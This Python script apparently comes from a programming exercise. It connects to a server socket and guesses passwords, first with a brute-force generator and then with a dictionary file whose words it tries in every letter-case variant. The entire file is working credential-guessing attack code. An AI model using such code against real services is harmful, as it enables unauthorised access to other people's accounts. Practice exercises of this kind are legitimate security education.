from itertools import product
import socket
import sys
import string


def password_generator():
    possible_symbols = string.ascii_letters + string.digits
    for i in range(1_000_000):
        for message in product(possible_symbols, repeat=i + 1):
            yield message


def connect_to_server(arguments):
    _ip_address = arguments[1]
    _port = int(arguments[2])
    _client_soket = socket.socket()
    _client_soket.connect((_ip_address, _port))
    return _client_soket


def brute_force(client_socket):  # client_socket
    generator = password_generator()
    for message in generator:
        password = ''.join(message)
        client_socket.send(password.encode())
        response = client_socket.recv(1024).decode()
        if response == "Connection success!":
            print(password)
            break


def case_generator(_password) -> str:
    if not _password.isdigit():
        all_spelling_options = map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in _password)))
        for i in all_spelling_options:
            yield i
    else:
        yield _password


def try_dictionary_password(_dict_file, _client_socket):
    password_pull = tuple(sorted(open(_dict_file).read().split("\n")))
    for password in password_pull:
        generator = case_generator(password)
        for pas in generator:
            _client_socket.send(pas.encode())
            response = _client_socket.recv(1024).decode()
            if response == "Connection success!":
                print(pas)
                exit()


def main():
    args = sys.argv
    if len(args) < 3:
        print("Not enough arguments. Please provide : ip_address, port, message")
        exit()
    client_socket = connect_to_server(args)
    dictionary_file = "hacking/passwords.txt"
    try_dictionary_password(dictionary_file, client_socket)
    client_socket.close()  # close connection


if __name__ == '__main__':
    main()
